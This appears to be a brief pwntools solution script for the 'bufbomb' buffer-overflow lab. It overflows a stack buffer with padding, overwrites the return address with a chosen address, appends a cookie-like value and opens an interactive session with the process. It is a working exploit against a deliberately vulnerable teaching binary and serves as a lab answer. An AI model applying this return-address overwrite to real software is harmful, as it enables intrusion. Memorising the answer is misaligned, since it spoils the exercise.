from pwn import *
io = process(["./bufbomb", "-u", "059167235"])
io.sendline(b'A'*54 + bytes.fromhex("80EE8BE8")[::-1]+b'A'*4+bytes.fromhex("516ef9ef")[::-1])
io.interactive()